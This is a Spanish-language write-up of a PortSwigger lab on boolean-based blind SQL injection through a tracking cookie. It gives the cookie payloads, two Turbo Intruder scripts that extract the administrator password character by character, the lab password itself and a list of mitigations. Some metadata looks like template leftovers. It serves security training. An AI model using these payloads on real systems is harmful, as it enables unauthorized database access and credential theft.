---
title: "Inyección SQL ciega con respuestas condicionales"
platform: "PortSwigger"
os: "Windows"
difficulty: "Hard"
ip: "10.10.10.XXX"
slug: "inyeccion-sql-ciega-con-respuestas-condicionales"
author: "Z4k7"
date: "2026-03-27"
year: "2026"
status: "pwned"
tags:
  - "sqli"
  - "web"
  - "blind"
  - "condicional"
  - "practitioner"
techniques:
  - "Blind SQL Injection"
  - "boolean-based"
  - "respuestas condicionales"
  - "SUBSTRING"
  - "LENGTH"
  - "cookie injection"
tools:
  - "BurpSuite"
  - "Turbo Intruder"
  - "Python"
flags_list:
  - label: "usuario"
    value: "administrator"
  - label: "password"
    value: "szo4ajhcyhdya4tejwsy"
summary: "La SQL Injection ciega basada en respuestas condicionales explota la cookie TrackingId concatenada sin sanitización. No hay output visible ni errores — el único canal de datos es la presencia/ausencia del mensaje Welcome back! en la respuesta. Cadena de ataque: confirmar canal booleano → validar tabla users → confirmar usuario administrator → LENGTH(password) = 20 chars → SUBSTRING carácter a carácter via Turbo Intruder → password completo → login.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Se identifica la cookie `TrackingId` via BurpSuite:
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312102736548.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          La aplicación usa la cookie en una consulta SQL interna:
      - kind: "code"
        lang: "SQL"
        code: |
          SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
      - kind: "note"
        text: |
          Canal de exfiltración: mensaje `Welcome back!` aparece si la consulta devuelve filas (TRUE), desaparece si no devuelve filas (FALSE).
      - kind: "callout"
        type: "warning"
        label: "Pista del lab"
        text: "La contraseña solo contiene caracteres alfanuméricos en minúscula."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "En Blind SQLi condicional, el canal de datos es la diferencia de comportamiento de la app — no el body de la respuesta. Aquí es el mensaje `Welcome back!`. En otros escenarios podría ser un redirect, un status code diferente, o incluso el tamaño de la respuesta. Siempre identifica cuál es tu canal antes de lanzar payloads."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Confirmación del canal booleano:
      - kind: "code"
        lang: "SQL"
        code: |
          TrackingId=ZOJsKxwcUk6uwuo0'+AND+'1'='1'--  → con mensaje Welcome back! (TRUE)
          TrackingId=ZOJsKxwcUk6uwuo0'+AND+'1'='2'--  → sin mensaje (FALSE)
      - kind: "bullet"
        text: "Vector: cookie TrackingId"
      - kind: "bullet"
        text: "Canal: presencia/ausencia de Welcome back!"
      - kind: "bullet"
        text: "Motor de BD: por confirmar (acepta --)"
      - kind: "bullet"
        text: "Tabla objetivo: users con columnas username, password"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "La validación booleana `1=1` vs `1=2` es el primer paso en cualquier Blind SQLi condicional. Si la respuesta de la app cambia entre ambos payloads, tienes control total del canal. Si no cambia, necesitas buscar otro canal (time-based, error-based, OAST)."

  - id: "step3"
    num: "03"
    title: "Paso 1 — Confirmar tabla users"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          TrackingId=ZOJsKxwcUk6uwuo0'+AND+(SELECT+'a'+FROM+users+WHERE+ROWNUM=1)='a'--
      - kind: "callout"
        type: "info"
        label: "Explicación"
        text: "Si la tabla `users` existe y tiene al menos una fila, la subconsulta devuelve `'a'` y la comparación `'a'='a'` resulta verdadera → aparece `Welcome back!`. Esto confirma que la tabla existe y es accesible."
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312102954570.jpg"
        caption: "Evidencia técnica"

  - id: "root"
    num: "04"
    title: "Paso 2 — Confirmar usuario administrator"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          TrackingId=ZOJsKxwcUk6uwuo0'+AND(SELECT+'a'+FROM+users+WHERE+username='administrator')='a'--;
      - kind: "callout"
        type: "info"
        label: "Explicación"
        text: "Ya contamos con el nombre de la tabla `users`. Confirmamos si existe un usuario llamado `administrator` — como es correcto, aparece `Welcome back!`."
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312103038909.jpg"
        caption: "Evidencia técnica"

  - id: "step5"
    num: "05"
    title: "Paso 3 — Determinar longitud del password"
    content:
      - kind: "code"
        lang: "SQL"
        code: |
          TrackingId=ZOJsKxwcUk6uwuo0'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>1)='a'--
      - kind: "note"
        text: |
          Si supera la cantidad de caracteres indicada → no aparece `Welcome back!`.
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312103104290.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validando por medio de Intruder se calcula 20 caracteres en el password.
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312103250149.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Script Turbo Intruder para longitud:
      - kind: "code"
        lang: "PYTHON"
        code: |
          def queueRequests(target, wordlists):
              engine = RequestEngine(endpoint=target.endpoint,
                                     concurrentConnections=5,
                                     requestsPerConnection=100,
                                     pipeline=False)
          
              for word in open('C:\\Users\\Public\\abc.txt'):
                  engine.queue(target.req, word.rstrip())
          
          def handleResponse(req, interesting):
              start_tag = '<section class="top-links">'
              end_tag = '</section>'
              
              if start_tag in req.response:
                  content = req.response.split(start_tag)[1].split(end_tag)[0]
                  if '<div>' in content:
                      welcome_text = content.split('<div>')[1].split('</div>')[0]
                      req.label = welcome_text
                      table.add(req)
              elif req.status != 404:
                  table.add(req)
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312103336493.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El script detecta `Welcome back!` en el HTML para identificar cuándo la condición es TRUE. La lógica: si el mensaje aparece → el número probado es menor que la longitud real → seguimos incrementando. Cuando desaparece → encontramos el límite."

  - id: "step6_1"
    num: "06"
    title: "Paso 4 — Extraer password carácter a carácter"
    content:
      - kind: "note"
        text: |
          Payload base:
      - kind: "code"
        lang: "SQL"
        code: |
          TrackingId=ZOJsKxwcUk6uwuo0'+AND+(SELECT+SUBSTRING(password,§pos§,1)+FROM+users+WHERE+username='administrator')='§char§'--;
      - kind: "note"
        text: |
          Script Turbo Intruder para extracción:
      - kind: "code"
        lang: "PYTHON"
        code: |
          def queueRequests(target, wordlists):
              engine = RequestEngine(endpoint=target.endpoint,
                                     concurrentConnections=1,
                                     requestsPerConnection=100,
                                     pipeline=False)
          
              for numero in range(0, 20):
                  with open('C:\\Users\\Public\\abc.txt') as f:
                      for word in f:
                          word = word.rstrip()
                          engine.queue(target.req, [str(numero), word])
          
          def handleResponse(req, interesting):
              start_tag = '<section class="top-links">'
              end_tag = '</section>'
              
              if start_tag in req.response:
                  content = req.response.split(start_tag)[1].split(end_tag)[0]
                  if '<div>' in content:
                      welcome_text = content.split('<div>')[1].split('</div>')[0]
                      req.label = welcome_text
                      table.add(req)
              elif req.status != 404:
                  table.add(req)
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312103421965.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El script itera 20 posiciones × todos los caracteres del diccionario abc.txt. Cuando el carácter en la posición N coincide con el real → la condición es TRUE → aparece `Welcome back!` → el script lo captura con `req.label`. Turbo Intruder es necesario porque Intruder Community es demasiado lento para 20 × 36 requests."

  - id: "exploit"
    num: "07"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Password completo extraído via Blind SQLi condicional. Login exitoso como administrator.
      - kind: "image"
        src: "assets/images/Inyecci%C3%B3n%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312103727177.jpg"
        caption: "Evidencia técnica"

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "usuario"
        value: "administrator"
      - label: "password"
        value: "szo4ajhcyhdya4tejwsy"

  - id: "privesc_1"
    num: "08"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          No aplica — el acceso obtenido ya es el de administrador.

lessons:
  - 'La SQLi ciega requiere paciencia y automatización — Turbo Intruder es clave para extraer datos.'
  - 'En auditorías, siempre validar primero la existencia de tablas y usuarios antes de extraer datos sensibles.'
  - 'La diferencia entre SQLi clásica (errores visibles) y SQLi ciega (inferencia por comportamiento).'
  - 'La explotación se basa en respuestas booleanas — la defensa más sólida es la parametrización.'
mitigation:
  - 'Implementar consultas parametrizadas (Prepared Statements).'
  - 'Evitar concatenación de valores de cookies en SQL.'
  - 'Monitorear patrones de requests repetitivos (detección de brute-force).'
  - 'Configurar WAF para bloquear payloads comunes de SQLi.'
  - 'Revisar logs de aplicación para detectar anomalías en cookies.'
---
